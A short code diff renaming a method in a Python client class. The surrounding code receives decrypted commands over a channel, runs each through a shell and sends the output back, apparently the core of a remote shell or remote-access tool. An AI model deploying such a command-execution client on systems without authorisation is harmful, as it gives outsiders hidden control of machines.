@@ -92,10 +92,10 @@ class Client(object):
   while all([self.is_alive, self.communication.is_alive]):
    while self.communication.recvs_decrypted.qsize():
     cmd = self.communication.recvs_decrypted.get()
-    output = self.exec(cmd)
+    output = self.exe(cmd)
     self.communication.send(output)    
 
- def exec(self, cmd):
+ def exe(self, cmd):
   if cmd.strip() == 'cls':return '-1'
   proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
   output = proc[0].decode('utf8')
